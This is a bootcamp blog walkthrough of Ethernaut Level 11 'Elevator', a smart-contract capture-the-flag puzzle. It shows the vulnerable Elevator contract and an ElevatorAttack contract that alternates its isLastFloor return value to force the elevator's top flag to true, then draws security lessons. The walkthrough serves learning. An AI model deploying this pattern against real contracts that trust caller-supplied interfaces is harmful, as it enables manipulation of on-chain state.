



Ethernaut Level 11 Walkthrough: Elevator - Metana





















































































 












Skip links* [Skip to primary navigation](#primary-nav)
* [Skip to content](#lqd-site-content)



 





 


 




Call us +1 415 416 0800 


















 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 








* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Bootcamps](#) 








###### Web3

 






### Web3 Solidity Bootcamp



Most Popular 🔥
The most advanced Solidity curriculum on the internet











### Full Stack Web3 Beginner Bootcamp



New ✨ | Beginner 👨‍💻
Starting off with web development and seamlessly integrating web3 development











### Web3 Rust Bootcamp



Become an expert Solana blockchain developer with one course!














###### Coding + Career Growth

 




 








### Software Engineering Bootcamp



Become a Software Engineer - Balance everyday life commitments & launch your coding career in as little as 16 weeks











### Metana's JobCamp™️



Learn to make a lasting first impressions, network effectively & search for jobs with confidence.















 ![](https://metana.io/wp-content/uploads/2023/10/Screenshot-2023-10-25-at-7.51.33 PM-300x61.png) 




 Rated
the Best

 





 Ranked as the industry's premier Web3 bootcamp with a stellar 4.8/5 star rating on Course Report.

 




[Read more reviews here](/reviews/)












[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)
* [Resources](#)
	+ [Reviews](https://metana.io/reviews/)
	+ [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
	+ [Tuition](https://metana.io/tuition/)
	+ [Events](https://metana.io/events/)
* [Blog](https://metana.io/blog/)

 





[Apply now](https://metana.typeform.com/general)






















 







 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 









Metana Bootcamps
----------------

 






* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Full Stack Web3 Bootcamp](https://metana.io/web3-beginner-bootcamp/)
* [Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [Cybersecurity Bootcamp](https://metana.io/cybersecurity-bootcamp/)
* [AI & Machine Learning Bootcamp](https://metana.io/ai-machine-learning-bootcamp/)
* [Data Analytics Bootcamp](https://metana.io/data-analytics-bootcamp/)
* [Data Science Bootcamp](https://metana.io/data-science-bootcamp/)
* [Full Stack Bootcamp](https://metana.io/full-stack-software-engineer-bootcamp/)
* [Jobcamp](https://metana.io/jobcamp/)

 














Menu Items
----------

 






* [Blog](https://metana.io/blog/)
* [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
* [Refer a Friend](https://metana.io/refer/)
* [Tuition](https://metana.io/tuition/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)

 









 








 [[email protected]](/cdn-cgi/l/email-protection)

 




 

[Facebook](https://www.facebook.com/metanahq) 


[Twitter](https://twitter.com/metanahq) 


[Linkedin](https://www.linkedin.com/school/metana/) 


























 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 




[Apply now](https://metana.typeform.com/general)
























 
#### Table of Contents





 







Ethernaut Level 11 Walkthrough: Elevator
========================================

 



 * [Janos Barna](https://metana.io/blog/author/janos-barna/)
* [June 10, 2024](https://metana.io/blog/2024/06/10/)
* [Ethernaut Walkthrough](https://metana.io/blog/category/ethernaut-walkthrough/)














**Ethernaut challenges**, comparable to a Web3-themed hacking Capture The Flag (CTF) competition, offer a dynamic environment for diving into Ethereum and Solidity programming. Each level introduces a distinct smart contract puzzle, designed to test your abilities in pinpointing and exploiting flaws.


As a full-stack software engineer diving into blockchain technology, these challenges act as valuable learning experiences to grasp the intricacies of smart contract vulnerabilities. Every level deepens our understanding of blockchain security, thus improving our skills in building decentralized applications. In this blog post, we’ll explore **Ethernaut Level 11**, where we decode the complexities of Solidity smart contracts and learn how to circumvent security measures.


In this Ethernaut challenge we get the following simple contract:



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```


The `Building` interface defines a function `isLastFloor` that returns whether a given floor is the last one. The `Elevator` contract’s `goTo` function calls `isLastFloor` on an external `Building` contract to check if a floor is the last floor. If the floor is not the last, it updates the elevator’s current floor and checks again to update its top floor status.


We get the following help, to beat this level:


*“This elevator won’t let you reach the top of your building. Right?*


*Things that might help:*


* *Sometimes solidity is not good at keeping promises.*
* *This*`*Elevator*`*expects to be used from a*`*Building*`*.”*


The `goTo` function in the `Elevator` contract relies on the external `Building` contract’s `isLastFloor` function to determine whether the specified floor is the top floor. If the `Building` contract is implemented in a way that always returns `false` for `isLastFloor`, the `Elevator` contract will never recognize any floor as the top floor (`top` will never be set to `true`), effectively preventing the elevator from reaching what it believes to be the top of the building.


How to Exploit
--------------


By alternating the return value of `isLastFloor`, another contract can trick the `Elevator` contract into believing it has reached the top floor when it sets the floor to the desired value. This can bypass the intended logic of the `Elevator` contract, which relies on an honest `isLastFloor` implementation to function correctly.



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Elevator.sol';

contract ElevatorAttack {
    bool public pwn = true;
    Elevator public target;

    constructor (address _targetAddress)  {
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint)public returns (bool){
        pwn = !pwn;
        return pwn;
    }
    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}
```


* When `setTop` is called, it invokes the `goTo` function of the `Elevator` contract with `_floor` as an argument.
* The `Elevator` contract then calls `isLastFloor(_floor)` on the `msg.sender`, which is the `ElevatorAttack` contract.
* On the first call to `isLastFloor`, `pwn` flips to `false` and returns `false`, making the `Elevator` contract set its `floor` to `_floor`.
* The `Elevator` contract then calls `isLastFloor` again to update `top`.
* On the second call, `pwn` flips to `true` and returns `true`, making the `Elevator` contract set `top` to `true`.


Conclusion
----------


Interfaces do not guarantee contract security: Just because another contract uses the same interface doesn’t mean it will behave as expected.


Be cautious with contract inheritance: Inheriting contracts that extend from interfaces can introduce security risks due to information obscurity, making each layer potentially less secure.


Check your compiler version: Be aware of the compiler version you’re using or inheriting from; view and pure functions might be compromised without your knowledge.


***Additional reading:***


<https://ethereum.org/en/developers/docs/smart-contracts/composability>


<https://docs.soliditylang.org/en/develop/contracts.html#view-functions>



![faq](https://metana.io/wp-content/uploads/2024/05/Questions-bro-1.svg)
FAQs
----


**How do I start solving Ethernaut challenges?**


* Visit Ethernaut and connect your Ethereum wallet.


**How do I use Remix IDE for Ethernaut challenges?**


* Open Remix IDE, create a new file, paste the contract code, compile, deploy, and interact with it using MetaMask.


**Where can I find Ethereum and Solidity documentation?**


* [Ethereum Developer Documentation](https://ethereum.org/en/developers/docs/)
* [Solidity Documentation](https://docs.soliditylang.org/)
* <https://docs.openzeppelin.com/>


**How do I deploy contracts on a test network?**


* Compile and deploy `Elevator.sol` and `ElevatorAttack.sol` using Remix IDE and MetaMask.


**What are essential Solidity concepts for this challenge?**


* Interfaces, external calls, state variables, function modifiers.






![](https://metana.io/wp-content/uploads/2024/06/Ethernaut-Level-11-Walkthrough-Elevator_.avif) 





[PrevPreviousOracles and External Data: Boosting Smart Contract Utility](https://metana.io/blog/oracles-and-external-data-boosting-smart-contract-utility/) 




[NextDemystifying SSL & Let’s Encrypt: Lock in Website SecurityNext](https://metana.io/blog/demystifying-ssl-lets-encrypt-lock-in-website-security/) 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy ✨

 




 You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






Web3 Solidity Bootcamp
======================

 





 The most advanced Solidity curriculum on the internet!

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-beginner-bootcamp/)













You may also like
-----------------

 






![](https://metana.io/wp-content/uploads/2024/07/Protect-Yourself-from-Rug-Pulls-Tips-to-Avoid-Crypto-Scams-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




9 mins ago

#### [Protect Yourself from Rug Pulls: Tips to Avoid Crypto Scams](https://metana.io/blog/protect-yourself-from-rug-pulls-tips-to-avoid-crypto-scams/)




The world of Web3 is brimming with promises of high returns and revolutionary projects, driving 


![](https://metana.io/wp-content/uploads/2024/07/ERC-Token-Standards-Your-Simplified-Guide-copy-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




1 day ago

#### [Address Poisoning in Smart Contracts](https://metana.io/blog/address-poisoning-in-smart-contracts/)




Web3 thrives on user empowerment and the ease of sending and receiving cryptocurrency. However, a 
 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy

 




You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






#### Web3 Solidity Bootcamp

 





 The most advanced Solidity curriculum on the internet

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services







 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




[View Program](/web3-beginner-bootcamp/)







Events by Metana
================

 





 Dive into the exciting world of Web3 with us as we explore cutting-edge technical topics, provide valuable insights into the job market landscape, and offer guidance on securing lucrative positions in Web3. 

 




 





 







Do you have anything you want us to cover in our blog posts? What should we talk about next? We need your suggestions! 
 





Submit
















Start Your  Application
-----------------------

 






Secure your spot now. Spots are limited, and we accept qualified applicants on a first come, first served basis..




 






Email(Required)

Career Track(Required)


Web3



Data



Full Stack



Cyber

  








Δ










The application is free and takes just 3 minutes to complete.

 















##### What is included in the course?

 






### Expert-curated curriculum










### Weekly 1:1 video calls with your mentor










### Weekly group mentoring calls










### On-demand mentor support










### Portfolio reviews by Design hiring managers










### Resume & LinkedIn profile reviews










### Active online student community










### 1:1 and group career coaching calls










### Access to our employer network










### Job Guarantee




















 






###### Address

 





 44 Montgomery St,   

San Francisco, CA 94104, United States

 












Email 







Subscribe












###### Contact us

 





###### Call us directly

 





 (415) 416-0800

 





###### Mail us directly

 





 [[email protected]](/cdn-cgi/l/email-protection)

 









### Company

 




* [Home](/)
* [Blog](https://metana.io/blog/)
* [Jobs at Metana](/jobs/)
* [Bootcamp Application](https://metana.io/apply/)
* [Refer a friend](/refer/)
* [Student Perks](/perks/)
* [Testimonials](/reviews)
* [LMS login](https://app.metana.io/)
* [Open LMS login (Full Stack)](https://open.metana.io/)









### Bootcamp

 




* [Web3 Bootcamps](https://metana.io/web3-0-bootcamp/)
* [- Solidity Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Web3 Beginner Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [- ZK Bootcamp](/web3-zero-knowledge-bootcamp/)
* [Data + AI bootcamps](#)
* [- Data Analytics Bootcamp](/data-analytics-bootcamp/)
* [- Data Science Bootcamp](/data-science-bootcamp/)
* [- AI/ML Bootcamp](/ai-machine-learning-bootcamp/)
* [Software Engineering Bootcamp](/full-stack-software-engineer-bootcamp/)
* [Cybersecurity Bootcamp](/cybersecurity-bootcamp/)
* [Jobcamp](/jobcamp/)
* [Tuition](https://metana.io/tuition/)









### For businesses

 




* [Business](https://metana.io/business/)
* [- Hiring Partner](https://metana.io/business/hiring-partner/)
* [- Upskill Your Team](/business/upskill-your-team/)









### Legal

 




* [Licences](https://metana.io/licences/)
* [Metana's Job Guarantee](https://metana.io/job-guarantee/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)
* [Privacy Policy](/privacy-policy/)













[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)








[![](https://metana.io/wp-content/uploads/2022/07/Metana-Logo-Black-Full.png)](https://metana.io) 







 Disclaimer:
‍
Metana is involved in the Blockchain Education activities only. We are not dealing with any Crypto related stuff nor provide advice in the Crypto related field.

 

















 Metana is a pioneer in education and career transformation, specializing in today’s most in-demand skills. The leading source for training, staffing, and career transitions, we foster a flourishing community of professionals pursuing careers they love.
| © 2023 Edmore (private) limited

 








[Facebook](https://www.facebook.com/metanahq) 





[Linkedin](https://www.linkedin.com/school/metana/) 














































































Adding {{itemName}} to cart


Added {{itemName}} to cart













Loading...



×






